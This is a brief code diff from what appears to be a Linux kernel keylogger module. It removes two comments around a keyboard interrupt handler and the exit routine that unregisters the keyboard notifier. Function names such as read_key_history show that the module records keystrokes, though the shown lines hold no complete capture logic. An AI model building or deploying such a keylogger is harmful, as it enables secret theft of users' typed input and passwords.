@@ -49,7 +49,6 @@ char *read_key_history(void)
 	return consumed_items;
 }
 
-// Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
 {
 	struct keyboard_notifier_param *param = dev_id;
@@ -98,7 +97,6 @@ int __init keylogger_module_init(void)
 
 void __exit keylogger_module_exit(void)
 {
-	// Unregister the keyboard notifier
 	int result = unregister_keyboard_notifier(&keyboard_notifier_block);
 
 	if (result != 0) {
